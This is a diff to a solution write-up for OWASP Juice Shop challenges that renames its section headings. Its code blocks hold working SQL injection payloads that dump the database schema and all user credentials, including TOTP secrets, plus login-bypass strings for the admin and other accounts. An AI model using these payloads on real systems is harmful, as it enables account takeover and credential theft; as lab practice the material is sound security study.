@@ -23,7 +23,9 @@ curl -sS -H "Accept: application/json" "http://juiceshop:3000/rest/products/sear
 }
 ```
 
-## Order the Christmas special offer of 2014
+## Christmas Special
+
+Order the Christmas special offer of 2014
 
 ```bash
 # find ProductId=10
@@ -37,7 +39,9 @@ curl http://juiceshop:3000/api/BasketItems/ \
   --data-raw '{"ProductId":10,"BasketId":"6","quantity":1}'
 ```
 
-## Exfiltrate the entire DB schema definition via SQL Injection
+## Database Schema
+
+Exfiltrate the entire DB schema definition via SQL Injection
 
 ```bash
 # Products table has 9 columns, add N static columns in order to match them and fix
@@ -45,7 +49,9 @@ curl http://juiceshop:3000/api/BasketItems/ \
 curl -sS -H "Accept: application/json" "http://juiceshop:3000/rest/products/search?q=foo%'))+UNION+SELECT+name,sql,'a','b','c','d','e','f','g'+FROM+sqlite_master+WHERE+type='table';--" | jq '.data | map({"id":.id,"name":.name})'
 ```
 
-## Log in with the (non-existing) accountant without ever registering that user
+## Ephemeral Accountant
+
+Log in with the (non-existing) accountant `acc0unt4nt@juice-sh.op` without ever registering that user
 
 ```bash
 # trigger error
@@ -75,49 +81,65 @@ http http://juiceshop:3000/rest/user/login email=\' password=foo
 http http://juiceshop:3000/rest/user/login email="' UNION SELECT 999,'myUsername','acc0unt4nt@juice-sh.op','myPassword','accounting','','0.0.0.0','','','1','2023-10-28 15:47:25.395 +00:00','2023-10-28 15:47:25.395 +00:00','NULL' FROM Users'--"
 ```
 
-## Log in with the administrator's user account
+## Login Admin
+
+Log in with the administrator's user account
 
 ```bash
 http http://juiceshop:3000/rest/user/login email="admin@juice-sh.op'--"
 ```
 
-## Log in with Bender's user account
+## Login Bender
+
+Log in with Bender's user account
 
 ```bash
 http http://juiceshop:3000/rest/user/login email="bender@juice-sh.op'--"
 ```
 
-## Log in with Jim's user account
+## Login Jim
+
+Log in with Jim's user account
 
 ```bash
 http http://juiceshop:3000/rest/user/login email="jim@juice-sh.op'--"
 ```
 
-## Let the server sleep for some time
+## NoSQL DoS
+
+Let the server sleep for some time
 
 ```bash
 TODO
 ```
 
-## All your orders are belong to us
+## NoSQL Exfiltration 
+
+All your orders are belong to us
 
 ```bash
 TODO
 ```
 
-## Update multiple product reviews at the same time
+## NoSQL Manipulation
+
+Update multiple product reviews at the same time
 
 ```bash
 TODO
 ```
 
-## Infect the server with juicy malware by abusing arbitrary command execution
+## SSTi
+
+Infect the server with juicy malware by abusing arbitrary command execution
 
 ```bash
 TODO
 ```
 
-## Retrieve a list of all user credentials via SQL Injection
+## User Credentials
+
+Retrieve a list of all user credentials via SQL Injection
 
 ```bash
 curl -sS -H "Accept: application/json" "http://juiceshop:3000/rest/products/search?q=foo%'))+UNION+SELECT+id,username,email,password,role,deluxeToken,totpSecret,isActive,createdAt+FROM+Users;--" | jq '.data'
